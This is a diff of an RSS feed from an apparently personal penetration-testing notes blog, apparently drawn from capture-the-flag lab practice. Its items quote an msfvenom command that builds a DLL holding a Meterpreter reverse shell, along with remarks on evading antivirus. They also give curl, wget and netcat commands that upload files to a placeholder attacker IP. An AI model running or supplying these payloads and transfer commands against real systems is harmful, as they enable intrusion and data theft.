@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Concept on Pwny_Sec</title>
@@ -11,24 +11,24 @@
     
     
     <item>
-      <title>DLL_CraFt&amp;BreW</title>
-      <link>/concepts/dll/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/concepts/dll/</guid>
-      <description>So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom &amp;amp; dll&amp;rsquo;s crafted with visual studio&amp;rsquo;s. cheers to IppSec and 0xdf
-MSFVENOM remember you don&amp;rsquo;t always need x64
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll  Beryllium https://github.com/attl4s/pruebas
-a dll that contains meterpreter shell that takes env var as variables</description>
-    </item>
-    
-    <item>
       <title>Desync-Attack</title>
       <link>/concepts/untitled/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/concepts/untitled/</guid>
       <description>This writeup will be based on James Kettle work, Click here. This artical is more about me learning how to do this attack.</description>
+    </item>
+    
+    <item>
+      <title>DLL_CraFt&amp;BreW</title>
+      <link>/concepts/dll/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/concepts/dll/</guid>
+      <description>So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom &amp;amp; dll&amp;rsquo;s crafted with visual studio&amp;rsquo;s. cheers to IppSec and 0xdf
+MSFVENOM	remember you don&amp;rsquo;t always need x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll Beryllium	https://github.com/attl4s/pruebas
+a dll that contains meterpreter shell that takes env var as variables</description>
     </item>
     
     <item>
@@ -39,9 +39,9 @@ a dll that contains meterpreter shell that takes env var as variables</descripti
       <guid>/concepts/file-transfer/</guid>
       <description>######## LI/NUX #########
 Python http server
-python3 -m http.server 9090 python -m simpleHTTPServer 9090  Curl
-upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file  wget
-upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename  NetCat File Transfer
+python3 -m http.server 9090 python -m simpleHTTPServer 9090 Curl
+upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file wget
+upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename NetCat File Transfer
 Netcat notice with this method , sender &amp;lt;, reciever &amp;gt;. -w wait, -l listener -p port
 upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt; file.</description>
     </item>
